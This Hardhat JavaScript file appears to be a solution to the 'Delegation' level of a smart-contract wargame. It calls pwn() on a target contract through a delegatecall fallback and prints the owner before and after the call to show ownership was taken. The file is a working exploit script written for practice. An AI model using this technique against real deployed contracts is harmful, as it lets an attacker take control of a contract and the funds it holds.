// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// When running the script with `npx hardhat run <script>` you'll find the Hardhat
// Runtime Environment's members available in the global scope.
const hre = require("hardhat");
const BigNumber = require('bignumber.js');
const { assert } = require("chai");

async function main() {

  const accounts = await hre.ethers.getSigners()
  let Level_Address = '0x9fd18EA11C8D19A83533595D8b8538F7DA6fb3fA'
  const payer = accounts[0]

  // let Delegate = await hre.ethers.getContractFactory('Delegate')
  // delegate = await Delegate.deploy(accounts[2].address)
  // await delegate.deployed()

  // let Delegation = await hre.ethers.getContractFactory('Delegation')
  // delegation = await Delegation.connect(accounts[1]).deploy(delegate.address)
  // await delegation.deployed()
  // Level_Address = delegation.address

  const abi = [
    // Read-Only Functions
    "function pwn() public",
    "function owner() view returns (address)",
  ];

  const dele = new hre.ethers.Contract(Level_Address, abi, payer);

  console.log('begin owner', await dele.owner(), payer.address)

  let tx = await dele.pwn({gasLimit: 500000})  // 这里再次， hardhat 预测 gas 出错， out of gas
  let txinfo = await tx.wait()
  console.log('transfer txhash', txinfo.blockNumber, txinfo.transactionHash)

  console.log('final owner', await dele.owner())
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });



  // npx hardhat run 6.Delegation/run.js